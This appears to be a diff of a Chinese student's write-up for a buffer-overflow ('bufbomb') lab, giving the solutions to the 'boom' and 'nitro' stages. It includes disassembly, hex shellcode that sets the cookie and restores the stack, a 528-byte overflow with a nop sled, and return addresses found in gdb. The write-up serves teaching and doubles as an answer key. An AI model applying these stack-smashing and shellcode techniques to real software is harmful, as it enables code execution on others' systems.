@@ -65,19 +65,106 @@ $./makecookie U202215559
 
 `boom`
 
-将攻击代码存储在字符串这块空间内。先将`getbuf`的返回地址改为攻击代码的首地址，接着在攻击代码中将返回地址更改为原值。通过简单的计算不难得到，返回地址所在的地址为`0x556832c4`，返回到哪里呢？`getbuf`是在`test`中被调用的，不难查到`call`的下一个指令地址为`0x8048e81`
-
-我们希望`getbuf`能够返回正确的cookie值，即`0x26e03bce`。
-
-我们回顾`getbuf`的代码，代码最后将`0x1`存入了`%eax`，使得`getbuf`永远返回`0x1`，因此我们要将这个立即数改为`0x26e03bce`。通过查询反汇编代码，我们可以知道这个立即数的地址为 `0x80491fe`。
+将攻击代码存储在字符串这块空间内。先将`getbuf`的返回地址改为攻击代码的首地址。在攻击代码中我们要将`%eax` 改为`0x26e03bce`，使得`getbuf` 返回正确的cookie。接着我们要还原栈状态和寄存器状态，将`%ebp` 改为`0x556832c0`，压入原本的返回地址`0x8048e81`和原本存入的`%ebp`值`0x556832f0`。
 
 万事俱备，我们开始编写攻击代码。
 
 ```asm6502
 00000000 <.text>:
    0:    b8 ce 3b e0 26           mov    $0x26e03bce,%eax
-   5:    a3 fe 91 04 08           mov    %eax,0x80491fe
-   a:    c7 05 c4 32 68 55 81     movl   $0x8048e81,0x556832c4
-  11:    8e 04 08 
-  14:    c3                       ret    
+   5:    bd c0 32 68 55           mov    $0x556832c0,%ebp
+   a:    68 81 8e 04 08           push   $0x8048e81
+   f:    68 f0 32 68 55           push   $0x556832f0
+  14:    c9                       leave  
+  15:    c3                       ret    
 ```
+
+如`bang`中所做的那样，将攻击代码注入到缓存区即可。
+
+`nitro`
+
+```asm6502
+08049204 <getbufn>:
+ 8049204:    55                       push   %ebp
+ 8049205:    89 e5                    mov    %esp,%ebp
+ 8049207:    81 ec 18 02 00 00        sub    $0x218,%esp
+ 804920d:    8d 85 f8 fd ff ff        lea    -0x208(%ebp),%eax
+ 8049213:    89 04 24                 mov    %eax,(%esp)
+ 8049216:    e8 37 fb ff ff           call   8048d52 <Gets>
+ 804921b:    b8 01 00 00 00           mov    $0x1,%eax
+ 8049220:    c9                       leave  
+ 8049221:    c3                       ret    
+ 8049222:    90                       nop
+ 8049223:    90                       nop
+```
+
+可知`buf`的起始位置为`-0x208(%ebp)`，要覆盖该函数的返回地址，我们写入`0x208+0x4+0x4 = 528`个字节即可。
+
+```asm6502
+08048e01 <testn>:
+ 8048e01:    55                       push   %ebp
+ 8048e02:    89 e5                    mov    %esp,%ebp
+ 8048e04:    53                       push   %ebx
+ 8048e05:    83 ec 24                 sub    $0x24,%esp
+ 8048e08:    e8 da ff ff ff           call   8048de7 <uniqueval>
+ 8048e0d:    89 45 f4                 mov    %eax,-0xc(%ebp)
+ 8048e10:    e8 ef 03 00 00           call   8049204 <getbufn>
+ 8048e15:    89 c3                    mov    %eax,%ebx
+ 8048e17:    e8 cb ff ff ff           call   8048de7 <uniqueval>
+ 8048e1c:    8b 55 f4                 mov    -0xc(%ebp),%edx
+ 8048e1f:    39 d0                    cmp    %edx,%eax
+ 8048e21:    74 0e                    je     8048e31 <testn+0x30>
+ 8048e23:    c7 04 24 0c a3 04 08     movl   $0x804a30c,(%esp)
+ 8048e2a:    e8 41 fb ff ff           call   8048970 <puts@plt>
+ 8048e2f:    eb 36                    jmp    8048e67 <testn+0x66>
+ 8048e31:    3b 1d 20 c2 04 08        cmp    0x804c220,%ebx
+ 8048e37:    75 1e                    jne    8048e57 <testn+0x56>
+ 8048e39:    89 5c 24 04              mov    %ebx,0x4(%esp)
+ 8048e3d:    c7 04 24 38 a3 04 08     movl   $0x804a338,(%esp)
+ 8048e44:    e8 87 fa ff ff           call   80488d0 <printf@plt>
+ 8048e49:    c7 04 24 04 00 00 00     movl   $0x4,(%esp)
+ 8048e50:    e8 ef 04 00 00           call   8049344 <validate>
+ 8048e55:    eb 10                    jmp    8048e67 <testn+0x66>
+ 8048e57:    89 5c 24 04              mov    %ebx,0x4(%esp)
+ 8048e5b:    c7 04 24 6a a1 04 08     movl   $0x804a16a,(%esp)
+ 8048e62:    e8 69 fa ff ff           call   80488d0 <printf@plt>
+ 8048e67:    83 c4 24                 add    $0x24,%esp
+ 8048e6a:    5b                       pop    %ebx
+ 8048e6b:    5d                       pop    %ebp
+ 8048e6c:    c3                       ret    
+```
+
+通过该函数我们该知道从`getbufn`返回后应返回的地址为`8048e15`
+
+且此时`%ebp`中的值为`0x28(%esp)`，那么我们写出汇编代码：
+
+```asm6502
+00000000 <.text>:
+   0:    b8 ce 3b e0 26           mov    $0x26e03bce,%eax
+   5:    8d 6c 24 28              lea    0x28(%esp),%ebp
+   9:    68 15 8e 04 08           push   $0x8048e15
+   e:    c3                       ret    ret 
+```
+
+接下来构建二进制攻击字符串，长度为528，利用nopsled的攻击方法，在真正的攻击代码之前全部填入nop指令。
+
+![](C:\Users\abc\AppData\Roaming\marktext\images\2024-04-02-11-27-02-image.png)
+
+现在的问题在于我们应跳转到哪里？
+
+我们进入`gdb`，使用`-n -u U202215559`参数运行`bufbomb`，在`getbufn`开头打下断点，观察`esp`的值。
+
+```
+0x556832c4 
+0x55683284
+0x55683304
+0x556832d4
+0x55683284
+```
+
+以相同参数运行一次，可以发现每次的`esp`值相同，可见对于每个参数，栈地址每次随机的值相同。我们直接选择地址最高的一个来算即可。即`0x55683304`
+
+选择一个合适的地址即可，此处答案并不唯一，比如我选择的是`0x5568 30f8`
+
+至此，本次试验全部完成！
+
